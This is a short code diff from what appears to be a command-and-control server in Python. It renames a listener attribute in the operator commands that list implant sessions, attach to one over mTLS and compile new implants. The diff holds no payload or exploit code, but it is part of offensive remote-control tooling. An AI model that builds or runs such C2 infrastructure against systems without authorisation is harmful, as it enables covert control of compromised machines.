@@ -38,12 +38,12 @@ class C2Server(object):
             print("Invalid Command")
             return("Invalid Command")
         elif command[0] == "sessions":
-            for id in self.listener.sessions.list():
+            for id in self.implantlistener.sessions.list():
                 print(id)
         # Interact with a session
         elif command[0] == "use":
             if len(command) == 2:
-                conn, addr = self.listener.sessions.get(command[1]) 
+                conn, addr = self.implantlistener.sessions.get(command[1]) 
                 print(f"Using session with {addr}")
                 mtls.session(conn) #this will hijack the the server essentially
             else:
@@ -51,7 +51,7 @@ class C2Server(object):
         # Compile an implant
         elif command[0] == "generate":
             print("Generating the implant...")
-            generate(self.listener.client_certs)
+            generate(self.implantlistener.client_certs)
         #elif command[0] == "users":
         #    self.printOperators()
         else:
